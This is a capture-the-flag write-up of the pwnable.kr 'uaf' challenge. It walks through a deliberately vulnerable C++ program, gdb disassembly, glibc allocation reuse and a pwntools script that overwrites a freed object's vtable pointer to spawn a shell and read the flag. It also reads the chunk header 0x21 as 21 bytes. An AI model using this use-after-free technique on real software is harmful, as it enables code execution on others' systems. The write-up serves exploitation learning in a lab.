# Pwnable.kr - UAF Writeup




## Challenge
```cpp
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```

## Solution

With my only prior knowledge is that use-after-free is related to Heap exploitation i started this challenge
Taking a look at the code shows us 2 subclasses, Man and Women, that belong to the Human class, and inside human class theres a very eye catching method named give_shell().
Inside the main function we instanciate both classes, allocating their contents to the Heap with name and age parameters.
after instanciating we have an infinite while loop with switch cases, 1 calls the introduce method for both instanciated classes, 2 reads length and file path and reads the contents, writing it into buf, which is allocated in heap, 3 deletes both instanciated classes.

My next line of tought was to see what happens when we call introduce(), so lets fire up gdb and see what happens exactly.

```
pwndbg> disass main
   0x0000000000400fb2 <+238>:	mov    eax,DWORD PTR [rbp-0x18]
   0x0000000000400fb5 <+241>:	cmp    eax,0x2
   0x0000000000400fb8 <+244>:	je     0x401000 <main+316>
   0x0000000000400fba <+246>:	cmp    eax,0x3
   0x0000000000400fbd <+249>:	je     0x401076 <main+434>
   0x0000000000400fc3 <+255>:	cmp    eax,0x1
   0x0000000000400fc6 <+258>:	je     0x400fcd <main+265>
   0x0000000000400fc8 <+260>:	jmp    0x4010a9 <main+485>
```
This is the switch block mentioned earlier, recognized by the cmp to 1,2 and 3. My interest is in 1 so lets break into it

```
   0x400fc3 <main+255>    cmp    eax, 1
   0x400fc6 <main+258>    je     main+265                      <main+265>
    ↓
   0x400fcd <main+265>    mov    rax, qword ptr [rbp - 0x38]
   0x400fd1 <main+269>    mov    rax, qword ptr [rax]
   0x400fd4 <main+272>    add    rax, 8
   0x400fd8 <main+276>    mov    rdx, qword ptr [rax]
   0x400fdb <main+279>    mov    rax, qword ptr [rbp - 0x38]
   0x400fdf <main+283>    mov    rdi, rax
   0x400fe2 <main+286>    call   rdx
```
Breakdown of whats happening here:
rbp-0x38 (0x614ee0, pointer to heap) loaded into rax, loading its content into itself (points to 0x401570, which points to 0x40117a, which is give_shell()!!!)
rax += 8, making it 0x401578, which points to 0x4012d2, which is Man::introduce()
rax is loaded into rdx.
rax gets set again to 0x614ee0, loads into rdi
call rdx, which is Man::introduce().

So we learned that give_shell() is 8 bytes under Man::introduce() which is being called, so theoretically we can subtract 8 and call give_shell(), but how can we do it?
Lets see what happens after we call 3, which deletes the instanced classes.
```
   0x400fc3 <main+255>    cmp    eax, 1
   0x400fc6 <main+258>    je     main+265                      <main+265>
    ↓
   0x400fcd <main+265>    mov    rax, qword ptr [rbp - 0x38]
 ► 0x400fd1 <main+269>    mov    rax, qword ptr [rax]
   0x400fd4 <main+272>    add    rax, 8
   0x400fd8 <main+276>    mov    rdx, qword ptr [rax]
   0x400fdb <main+279>    mov    rax, qword ptr [rbp - 0x38]
   0x400fdf <main+283>    mov    rdi, rax
   0x400fe2 <main+286>    call   rdx
   
   RAX  0x614ee0 ◂— 0x0

```
We can see that the contents of the previously used heap memory is now deleted, meaning it is now free to write to.
So how memory allocation works? According to https://reverseengineering.stackexchange.com/questions/15044/how-does-new-operator-internally-work-in-c , new and delete[] are wrappers to malloc() and free() respectively, and how malloc works in linux? According to https://reverseengineering.stackexchange.com/questions/15033/how-does-glibc-malloc-work , if requested allocation size is below or equal to the previously freed allocation, it will prioritize that same block (LIFO).
So theoretically, if we allocate the same size as the freed classes, we will overwrite the freed heap memory, and could possibly execute code.
according to the same question, we can see that the allocated memory is written right before the application data, which means in 64 bit systems, would be 0x6014ee0 -0x8
```
pwndbg> x/5gx 0x614ee0-0x8
0x614ed8:	0x0000000000000021	0x0000000000401570
0x614ee8:	0x0000000000000019	0x0000000000614ec8
0x614ef8:	0x0000000000000031
```
We can see the allocated memory size is 21 bytes, means we can theoretically write up to 21 bytes to replace the freed memory (not exactly true due to 4 byte alignment).

So what do we want to write?
 We know that 0x614ee0 points to 0x401570 which points to 0x40117a, which is our shell function, and we know we add 8 to rax during the function call, so we can subtract 8 from 0x614ee0 to result a call to the shell function.
 ```python
 from pwn import *

payload = p64(0x401570 - 8) 
file = open("./payload","wb")
file.write(payload)
```
Testing the payload:
```bash
~/pwnable/UAF$ ./uaf 8 ./payload 
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
Segmentation fault (core dumped)
```
We get segfault, why is that? Lets take a look with gdb
```
0x400fc3 <main+255>    cmp    eax, 1
   0x400fc6 <main+258>    je     main+265                      <main+265>
    ↓
   0x400fcd <main+265>    mov    rax, qword ptr [rbp - 0x38]
 ► 0x400fd1 <main+269>    mov    rax, qword ptr [rax]
   0x400fd4 <main+272>    add    rax, 8
   0x400fd8 <main+276>    mov    rdx, qword ptr [rax]
   0x400fdb <main+279>    mov    rax, qword ptr [rbp - 0x38]
   0x400fdf <main+283>    mov    rdi, rax
   0x400fe2 <main+286>    call   rdx
 
   0x400fe4 <main+288>    mov    rax, qword ptr [rbp - 0x30]
   0x400fe8 <main+292>    mov    rax, qword ptr [rax]
   
 RAX  0x614ee0 ◂— 0x0
 RBX  0x614f30 —▸ 0x401568 —▸ 0x4015d0 —▸ 0x602390 —▸ 0x7ffff7e77190
```
We can see that our payload got into RBX, and not RAX.
Lets take a look at the code again
```cpp
case 1:
				m->introduce();
				w->introduce();
				break;
.
.
.
case 3:
				delete m;
				delete w;
				break;
```
We see the order these classes get instanciated and freed, and we know malloc will allocate by LIFO, that means our payload will get allocated into w first, becasue it's first to be freed.
The solution is simple, allocate twice:
```bash
~/pwnable/UAF$ ./uaf 8 ./payload 
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ 
```
And theres our shell!

Lets try it again in pwnable's server:
```bash
~/pwnable/UAF$ base64 ./payload 
aBVAAAAAAAA=

uaf@pwnable:~$ mkdir /tmp/aaabbb
uaf@pwnable:~$ echo aBVAAAAAAAA=
aBVAAAAAAAA=
uaf@pwnable:~$ echo aBVAAAAAAAA= | base64 -d > /tmp/aaabbb/payload
uaf@pwnable:~$ cat /tmp/aaabbb/payload 
h@uaf@pwnable:~$ ./uaf 8 /tmp/aaabbb/payload
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ cat ./flag	
yay_f1ag_aft3r_pwning
```
Had fun and learned a lot solving this and i hope this has been useful for someone.
Source for malloc internals: https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=994a23248e258501979138f3b07785045a60e69f;hb=HEAD

